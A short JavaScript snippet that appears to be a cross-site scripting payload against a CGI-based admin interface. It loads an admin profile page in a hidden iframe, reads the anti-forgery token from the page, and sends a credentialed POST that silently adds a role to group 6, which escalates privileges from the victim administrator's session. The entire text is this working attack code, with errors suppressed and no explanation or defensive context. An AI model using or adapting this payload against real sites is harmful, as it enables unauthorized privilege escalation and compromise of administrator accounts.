const f = document.createElement('iframe');
f.style.display = 'none';
f.src = '/cgi-bin/admin/person/admin_profile.pl?pid=oslo_test&action=groupmembers&GroupID=6';
document.body.appendChild(f);
f.onload = () => {
  try {
    const u = f.contentDocument.querySelector('input[name=unique]')?.value;
    if (!u) return;
    fetch('/cgi-bin/admin/person/admin_profile.pl', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'pid=oslo_test&unique=' + u +
        '&action=save_members&group_id=6' +
        '&added_roles=' + encodeURIComponent('{"1001":{"93940":1}}') +
        '&removed_roles=%7B%221001%22%3A%7B%7D%7D' +
        '&added_permissions=%7B%7D&removed_permissions=%7B%7D&su='
    });
  } catch (e) {}
};
